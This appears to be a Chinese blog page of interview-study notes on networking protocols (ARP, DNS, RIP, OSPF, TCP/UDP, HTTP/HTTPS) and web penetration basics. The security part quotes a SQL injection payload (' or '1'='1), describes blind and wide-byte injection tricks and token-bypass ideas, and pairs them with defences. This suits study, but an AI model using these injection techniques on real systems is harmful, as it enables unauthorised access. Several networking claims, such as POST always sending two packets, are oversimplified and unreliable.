<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="いらっしゃいませ">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>いらっしゃいませ</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">いらっしゃいませ</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">いらっしゃいませ</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title"></h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-03-30
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><p>arp 协议的工作原理 </p>
<p>地址解析协议，即 ARP（Address Resolution Protocol），是根据 IP 地址获取物理地址的一个TCP&#x2F;IP 协议。 </p>
<ol>
<li>发送 ARP 请求的以太网数据帧 广播 到以太网上的每个主机，ARP 请求帧中包含了目的主机的 IP 地址。 </li>
<li>目的主机收到了该 ARP 请求之后，会发送一个 ARP 应答，里面包含了目的主机的 MAC 地址。</li>
</ol>
<p>ARP 协议工作原理： </p>
<p>每个主机都会在自己的 ARP 缓冲区中建立一个 ARP 列表，以表示 IP 地址和 MAC地址之间的对应关系。主机（网络接口）新加入网络时（也可能只是 mac 地址发生变化，接口重启等），会发送免费 ARP 报文把自己 IP 地址与 Mac 地址的映射关系广播给其他主机。网络上的主机接收到免费 ARP 报文时，会更新自己的 ARP 缓冲区。将新的映射关系更新到 自己的 ARP 表中。 某个主机需要发送报文时，首先检查 ARP 列表中是否有对应 IP 地址的目的主机的 MAC地址，如果有，则直接发送数据，如果没有，就向本网段的所有主机发送ARP 数据包，该数据包包括的内容有：源主机 IP 地址，源主机 MAC 地址，目的主机的IP 地址等。当本网络的所有主机收到该 ARP数据包时： </p>
<p>（A）首先检查数据包中的 IP 地址是否是自己的IP 地址，如果不是，则忽略该数据包。 </p>
<p>（B）如果是，则首先从数据包中取出源主机的 IP和 MAC 地址写入到 ARP 列表中，如果 已经存在，则覆盖。 </p>
<p>（C） 然后将自己的 MAC 地址写入 ARP 响应包中，告诉源主机自己是它想要找的 MAC地址。 </p>
<p>源主机收到 ARP 响应包后。将目的主机的IP 和 MAC 地址写入 ARP 列表，并利用此信息发送数据。如果源主机一直没有收到 ARP响应数据包，表示 ARP 查询失败。ARP 高速 缓存（即 ARP 表）是 ARP 地址解析协议能够高效运行的关键 什么是 RARP？工作原理概括： 反向地址转换协议，网络层协议，RARP 与 ARP 工作方式相反。 RARP 使只知道自己 硬件地址的主机能够知道其 IP 地址。RARP 发出要反向解释的物理地址并希望返回其 IP地址， 应答包括能够提供所需信息的 RARP 服务器发出的 IP 地址。 原理： </p>
<ol>
<li>网络上的每台设备都会有一个独一无二的硬件地址，通常是由设备厂商分配的 MAC 地址。主机从网卡上读取 MAC 地址，然后在网络上发送一个 RARP 请求的广播数据包，请求 RARP服务器回复该主机的 IP 地址。 </li>
<li>RARP 服务器收到了 RARP 请求数据包，为其分配 IP 地址，并将 RARP 回应发送给主机。 </li>
<li>PC1 收到 RARP 回应后，就使用得到的 IP 地址进行通讯。</li>
</ol>
<p>dns 是什么？dns 的工作原理 </p>
<p>将主机域名转换为 ip 地址，属于应用层协议，使用 UDP 传输。（DNS 应用层协议，以前有个考官问过） </p>
<p>过程： </p>
<p>总结： 浏览器缓存，系统缓存，路由器缓存，IPS 服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。 </p>
<p>一、主机向本地域名服务器的查询一般都是采用递归查询。 </p>
<p>二、本地域名服务器向根域名服务器的查询的迭代查询。 </p>
<ol>
<li>当用户输入域名时，浏览器先检查自己的缓存中是否 这个域名映射的 ip 地址，有解析结束。</li>
<li>若没命中，则检查操作系统缓存（如 Windows 的 hosts）中有没有解析过的结果，有解析结束。 </li>
<li>若无命中，则请求本地域名服务器解析（ LDNS）。 </li>
<li>若 LDNS 没有命中就直接跳到根域名服务器请求解析。根域名服务器返回给 LDNS 一个 主域名服务器地址。 </li>
<li>此时 LDNS 再发送请求给上一步返回的 gTLD（ 通用顶级域）， 接受请求的 gTLD 查找并返回这个域名对应的 Name Server 的地址 </li>
<li>Name Server 根据映射关系表找到目标 ip，返回给 LDNS </li>
<li>LDNS 缓存这个域名和对应的 ip， 把解析的结果返回给用户，用户根据 TTL 值缓存到本地系统缓存中，域名解析过程至此结束</li>
</ol>
<p>rip 协议是什么？rip 的工作原理 </p>
<p>RIP 动态路由选择协议（网络层协议） </p>
<p>RIP 是一种基于距离矢量（Distance-Vector）算法的协议，它使用跳数（Hop Count）作为度量来衡量到达目的网络的路由距离。RIP 通过 UDP 报文进行路由信息的交换，使用的端口号为 520。 </p>
<p>工作原理： </p>
<p>RIP 路由协议用“更新（UNPDATES）”和“请求（REQUESTS）”这两种分组来传输信息的。每个具有 RIP 协议功能的路由器每隔 30 秒用 UDP520 端口给与之直接相连的机器广播更新信息。并且在（ 用“路程段数”（即“跳数”）作为网络距离的尺度。每个路由器在）给邻路由器发出路由信息时，都会给每个路径加上内部距离。 </p>
<p>路由器的收敛机制： </p>
<p>任何距离向量路由选择协议（如 RIP）都有一个问题，路由器不知道网络的全局情况，路由器必须依靠相邻路由器来获取网络的可达信息。由于路由选择更新信息在网络上传播慢，距离向量路由选择算法有一个慢收敛问题，这个问题将导致不一致性产生。</p>
<p>RIP 较少路由收敛机制带来的问题： </p>
<ol>
<li>记数到无穷大机制： RIP 协议允许最大跳数为 15。大于 15 的目的地被认为是不可达。 当路径的跳数超过 15，这条路径才从路由表中删除。 </li>
<li>水平分割法： 路由器不向路径到来的方向回传此路径。当打开路由器接口后，路由器记录路径是从哪个接口来的，并且不向此接口回传此路径。</li>
<li>破坏逆转的水平分割法： 忽略在更新过程中从一个路由器获取的路径又传回该路由器 </li>
<li>保持定时器法： 防止路由器在路径从路由表中删除后一定的时间内（通常为 180 秒）接受新的路由信息。保证每个路由器都收到了路径不可达信息</li>
<li>触发更新法： 当某个路径的跳数改变了，路由器立即发出更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。</li>
</ol>
<p>RIP 的缺点 </p>
<p>1、由于 15 跳为最大值，RIP 只能应用于小规模网络；</p>
<p>2、收敛速度慢；</p>
<p>3、根据跳数选择的路由，不一定是最优路由。 </p>
<p>OSPF 协议？OSPF 的工作原理 </p>
<p>OSPF（Open Shortest Pass First,开放最短路径优先协议），是一个最常用的内部网管协议，是一个链路状态协议。(网络层协议,) </p>
<p>原理： </p>
<p>OSPF 组播的方式在所有开启 OSPF 的接口发送 Hello 包，用来确定是否有 OSPF 邻居，若发现了，则建立 OSPF 邻居关系，形成邻居表，之后互相发送 LSA（链路状态通告）相互通告路由，形成 LSDB（链路状态数据库）。再通过 SPF 算法，计算最佳路径（cost 最小）后放入路由表。 </p>
<p>TCP 与 UDP 区别总结？ </p>
<ol>
<li><p>TCP 面向连接（如打电话要先拨号建立连接）提供可靠的服务;UDP 是无连接的，即发送数据之前不需要建立连接；UDP 尽最大努力交付，即不保证可靠交付。（由于 UDP 无需建立连接，因此 UDP 不会引入建立连接的时延，TCP 需要在端系统中维护连接状态，比如接受和发送缓存，拥塞控制，序号与确认号的参数等，故 TCP 会比 UDP 慢） </p>
</li>
<li><p>UDP 具有较好的实时性，工作效率比 TCP 高，适用于对高速传输和实时性有较高的通信或广播通信。 </p>
</li>
<li><p>每一条 TCP 连接只能是一对一的;UDP 支持一对一，一对多，多对一和多对多的交互通信 </p>
</li>
<li><p>UDP 分组首部开销小，TCP 首部开销 20 字节;UDP 的首部开销小，只有 8 个字节。 </p>
</li>
<li><p>TCP 面向字节流，实际上是 TCP 把数据看成一连串无结构的字节流;UDP 是面向报文的（一 次交付一个完整的报文，报文不可分割，报文是 UDP 数据报处理的最小单位）。 </p>
</li>
<li><p>UDP 适合一次性传输较小数据的网络应用，如 DNS，SNMP 等</p>
</li>
</ol>
<p>什么是三次握手四次挥手？tcp 为什么要三次握手？ </p>
<p>GET 和 POST 的区别 </p>
<ol>
<li>get 是获取数据，post 是修改数据 </li>
<li>get 把请求的数据放在 url 上， 以?分割 URL 和传输数据，参数之间以&amp;相连，所以 get 不太安全。而 post 把数据放在 HTTP 的包体内（requrest body） </li>
<li>get 提交的数据最大是 2k（ 限制实际上取决于浏览器）， post 理论上没有限制。 </li>
<li>GET 产生一个 TCP 数据包，浏览器会把 http header 和 data 一并发送出去，服务器响应 200(返回数据); POST 产生两个 TCP 数据包，浏览器先发送 header，服务器响应 100 continue，浏览器再发送 data，服务器响应 200 ok(返回数据)。 </li>
<li>GET 请求会被浏览器主动缓存，而 POST 不会，除非手动设置。 </li>
<li>GET 是幂等的，而 POST 不是幂等的</li>
</ol>
<p>Cookies 和 session 区别 </p>
<p>Cookie 和 Session 都是客户端与服务器之间保持状态的解决方案 </p>
<p>1，存储的位置不同，cookie：存放在客户端，session：存放在服务端。Session 存储的数据比较安全 </p>
<p>2，存储的数据类型不同 两者都是 key-value 的结构，但针对 value 的类型是有差异的 cookie：value 只能是字符串类型，session：value 是 Object 类型 </p>
<p>3，存储的数据大小限制不同 cookie：大小受浏览器的限制，很多是是 4K 的大小， session：理论上受当前内存的限制</p>
<p>4，生命周期的控制 cookie 的生命周期当浏览器关闭的时候，就消亡了 </p>
<p>(1)cookie 的生命周期是累计的，从创建时，就开始计时，20 分钟后，cookie 生命周期结束， </p>
<p>(2)session 的生命周期是间隔的，从创建时，开始计时如在 20 分钟，没有访问 session，那么 session 生命周期被销毁 </p>
<p>session的工作原理？ </p>
<p>session的工作原理是客户端登录完成之后，服务器会创建对应的 session，session 创建完之后，会把 session 的 id 发送给客户端，客户端再存储到浏览器中。这样客户端每次访问服务器时，都会带着 sessionid，服务器拿到 sessionid 之后，在内存找到与之对应的 session这样就可以正常工作了。 </p>
<p>一次完整的 HTTP 请求过程 </p>
<p>域名解析 –&gt; 发起 TCP 的 3 次握手 –&gt; 建立 TCP 连接后发起 http 请求 –&gt; 服务器响应 http请求，浏览器得到 html 代码 –&gt; 浏览器解析 html 代码，并请求 html 代码中的资源（如 js、css、图片等） –&gt; 浏览器对页面进行渲染呈现给用户。 </p>
<p>HTTPS 和 HTTP 的区别 </p>
<ol>
<li>HTTP 协议传输的数据都是未加密的，也就是明文的，因此使用 HTTP 协议传输隐私信息非常不安全， HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议，要比 http 协议安全。 </li>
<li>https 协议需要到 ca 申请证书，一般免费证书较少，因而需要一定费用。 </li>
<li>http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</li>
</ol>
<p>https 的建立过程</p>
<ol>
<li>客户端发送请求到服务器端 </li>
<li>服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在 </li>
<li>客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端 </li>
<li>服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端 </li>
<li>客户端使用共享密钥解密数据 </li>
<li>SSL 加密建立</li>
</ol>
<p>OSI 的七层模型都有哪些？ </p>
<p>物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。 </p>
<p>数据链路层：接收来自物理层的位流形式的数据，并封装成帧，传送到上一层 </p>
<p>网络层：将网络地址翻译成对应的物理地址，并通过路由选择算法为分组通过通信子网选择最适当的路径。 </p>
<p>传输层：在源端与目的端之间提供可靠的透明数据传输 </p>
<p>会话层：负责在网络中的两节点之间建立、维持和终止通信 </p>
<p>表示层：处理用户信息的表示问题，数据的编码，压缩和解压缩，数据的加密和解密</p>
<p>应用层：为用户的应用进程提供网络通信服务 </p>
<p>http 长连接和短连接的区别 </p>
<p>在 HTTP&#x2F;1.0 中默认使用短连接。也就是说，客户端和服务器每进行一次 HTTP 操作，就建立一次连接，任务结束就中断连接。而从 HTTP&#x2F;1.1 起，默认使用长连接，用以保持连接特性。</p>
<p>什么是TCP粘包&#x2F;拆包？发生原因？</p>
<p>一个完整的业务可能会被TCP 拆分成多个包进行发送，也有可能把多个小的包封装成一个大的数据包发送，这个就是 TCP 的拆包和粘包问题。</p>
<ol>
<li>原因：<ol>
<li>应用程序写入数据的字节大小大于套接字发送缓冲区的大小.</li>
<li>进行 MSS 大小的 TCP 分段。( MSS&#x3D;TCP 报文段长度-TCP 首部长度)</li>
<li>以太网的 payload 大于 MTU 进行 IP 分片。（ MTU 指：一种通信协议的某一层上面所能通过的最大数据包大小。）</li>
</ol>
</li>
<li>解决方案：<ol>
<li>消息定长。</li>
<li>在包尾部增加回车或者空格符等特殊字符进行分割 3. 将消息分为消息头和消息尾。4. 使用其它复杂的协议，如 RTMP 协议等。</li>
</ol>
</li>
</ol>
<p>TCP 如何保证可靠传输？ </p>
<ol>
<li>三次握手。 </li>
<li>将数据截断为合理的长度。应用数据被分割成 TCP 认为最适合发送的数据块（按字节编 号，合理分片） </li>
<li>超时重发。当 TCP 发出一个段后，它启动一个定时器，如果不能及时收到一个确认就重 发</li>
<li>确认应答：对于收到的请求，给出确认响应 </li>
<li>校验和：校验出包有错，丢弃报文段，不给出响应 </li>
<li>序列号：对失序数据进行重新排序，然后才交给应用层 </li>
<li>丢弃重复数据：对于重复数据 ， 能够丢弃重复数据 </li>
<li>流量控制。TCP 连接的每一方都有固定大小的缓冲空间。TCP 的接收端只允许另一端发 送接收端缓冲区所能接纳的数据。这将防止较快主机致使较慢主机的缓冲区溢出。</li>
<li>拥塞控制。当网络拥塞时，减少数据的发送。</li>
</ol>
<p>常见的状态码有哪些？ </p>
<p>200 OK &#x2F;&#x2F;客户端请求成功 </p>
<p>403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务 </p>
<p>404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的 URL </p>
<p>500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误 URI 和 URL 的区别 URI，统一资源标识符，用来唯一的标识一个资源。URL 可以用来标识一个资源，而且还指明了如何定位这个资源。</p>
<p>路由技术 </p>
<p>路由器工作在 OSI 模型的第三层—网络层操作，其工作模式与二层交换相似，但路由器工作在第三层，这个区别决定了路由和交换在传递包时使用不同的控制信息，实现功能的方式就不同。工作原理是在路由器的内部也有一个表，这个表所标示的是如果要去某一个地方，下一步应该向哪里走，如果能从路由表中找到数据包下一步往哪里走，把链路层信息加上转发出去；如果不能知道下一步走向哪里，则将此包丢弃，然后返回一个信息交给源地址。路由技术实质上来说不过两种功能：决定最优路由和转发数据包。 </p>
<h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><p>WEB</p>
<p>什么是 SQL 注入攻击 ，如何防护SQL注入攻击</p>
<p>攻击者在 HTTP 请求中注入恶意的 SQL 代码，服务器使用参数构建数据库 SQL 命令时，恶意SQL 被一起构造，并在数据库中执行。用户登录，输入用户名 lianggzone，密码 ‘ or ‘1’&#x3D;’1 ，如果此时使用参数构造的方式，就会出现select * from user where name &#x3D; ‘lianggzone’ and password &#x3D; ‘’ or ‘1’&#x3D;‘1’不管用户名和密码是什么内容，使查询出来的用户列表不为空。如何防范 SQL 注入攻击使用预编译的 PrepareStatement 是必须的，但是一般我们会从两个方面同时入手。 </p>
<p>防护：</p>
<p>Web 端 </p>
<ol>
<li>有效性检验。 </li>
<li>限制字符串输入的长度。</li>
</ol>
<p>服务端 </p>
<ol>
<li>不用拼接 SQL 字符串。</li>
<li>使用预编译的 PrepareStatement。 </li>
<li>有效性检验。(为什么服务端还要做有效性检验？第一准则，外部都是不可信的，防止攻击者绕过 Web 端请求) </li>
<li>过滤 SQL 需要的参数中的特殊字符。比如单引号、双引号。什么是 XSS 攻击跨站点脚本攻击，指攻击者通过篡改网页，嵌入恶意脚本程序，在用户浏览网页时，控制用户浏览器进行恶意操作的一种攻击方式。对输入的特殊字符进行 Escape 转义处理 。</li>
<li>使用安全的 API </li>
<li>使用白名单来规范化输入验证方法</li>
</ol>
<p>为什么参数化查询可以防止 sql 注入 </p>
<p>原理: 	使用参数化查询数据库服务器不会把参数的内容当作 sql 指令的一部分来执行，是在数据库完成 sql 指令的编译后才套用参数运行。简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑 。</p>
<p>盲注是什么？怎么盲注？ </p>
<ol>
<li>盲注是在 SQL 注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注入和利用的方式。</li>
<li>盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过 sql 语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用 benchmark，sleep 等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</li>
</ol>
<p>宽字节注入产生原理以及根本原因 </p>
<p>产生原理：在数据库使用了宽字符集而 WEB 中没考虑这个问题的情况下，在 WEB 层，由于 0XBF27 是两个字符，在 PHP 中比如 addslash 和 magic_quotes_gpc 开启时，由于会对 0x27 单引号进行转义，因此 0xbf27会变成 0xbf5c27,而数据进入数据库中时，由于 0XBF5C 是一个另外的字符，因此 \ 转义符号会被前面的 bf 带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。 </p>
<ol>
<li><p>根本原因 </p>
<p>character_set_client(客户端的字符集)和 character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding 使用不当。 </p>
</li>
<li><p>解决办法 </p>
<p>统一数据库、Web 应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为 UTF-8。或对数据进行正确的转义，如 mysql_real_escape_string+mysql_set_charset 的使用。</p>
</li>
</ol>
<p>CSRF </p>
<ol>
<li><p>原理 </p>
<p>CSRF ，即跨站点请求伪造，指攻击者通过跨站请求，以合法的用户的身份进行非法操作。可以这么理解 CSRF 攻击：攻击者盗用你的身份，以你的名义向第三方网站发送恶意请求。CRSF 能做的 事情包括利用你的身份发邮件，发短信，进行交易转账，甚至盗取账号信息。</p>
</li>
<li><p>防御</p>
<ol>
<li><p>token 机制。在 HTTP 请求中进行 token 验证，如果请求中没有 token 或者 token 内容不正确，则认为 CSRF 攻击而拒绝该请求。 </p>
</li>
<li><p>referer 识别。在 HTTP Header 中有一个字段 Referer，它记录了 HTTP 请求的来源地址。如果Referer 是其他网站，就有可能是 CSRF 攻击，则拒绝该请求。但是，服务器并非都能取到 Referer。很多用户出于隐私保护的考虑，限制了 Referer 的发送。在某些情况下，浏览器也不会发送 Referer，例如 HTTPS 跳转到 HTTP。 </p>
<p>而对 header 中的 referer 的验证，一个是空 referer，一个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。 </p>
</li>
<li><p>验证码。通常情况下，验证码能够很好的遏制 CSRF 攻击，但是很多情况下，出于用户体验考虑，验证码只能作为一种辅助手段，而不是最主要的解决方案。 </p>
</li>
<li><p>安全框架，例如 Spring Security。</p>
</li>
</ol>
</li>
</ol>
<p>验证 Referer 添加 tokentoken 和 referer 做横向对比，谁安全等级高</p>
<p>token 安全等级更高，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并且 FLASH 一些版本中可以自定义 referer。但是 token 的话，要保证其足够随机且不可泄露。(不可预测性原则) </p>
<p>如何针对token进行攻击绕过</p>
<p>针对 token 的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击信息泄露有可能是缓存、日志、get，也有可能是利用跨站很多跳转登录的都依赖 token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了另外也可以结合着其它业务来描述 token 的安全性及设计不好怎么被绕过比如抢红包业务之类的。</p>
<p>XSS 原理 </p>
<ol>
<li><p>反射型</p>
<p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。需要诱使用户“点击”一个恶意链接，才能攻击成功 </p>
</li>
<li><p>储存型 </p>
<p>存储型 XSS 会把用户输入的数据“存储”在服务器端。这种 XSS 具有很强的稳定性。 </p>
</li>
<li><p>DOM 型 </p>
<p>通过修改页面的 DOM 节点形成的 XSS，称之为 DOM Based XSS。</p>
</li>
</ol>
<p>DOM 型和反射型的区别 </p>
<p>反射型 XSS：通过诱导用户点击，我们构造好的恶意 payload 才会触发的 XSS。反射型 XSS 的检测我们在每次请求带 payload 的链接时页面应该是会带有特定的畸形数据的。</p>
<p>DOM型 XSS：通过修改页面的DOM 节点形成的 XSS。DOM-based XSS 由于是通过 js 代码进行 dom 操作产生的 XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。根本区别在我看来是输出点的不同。</p>
<p>DOM 型 XSS 自动化测试或人工测试 </p>
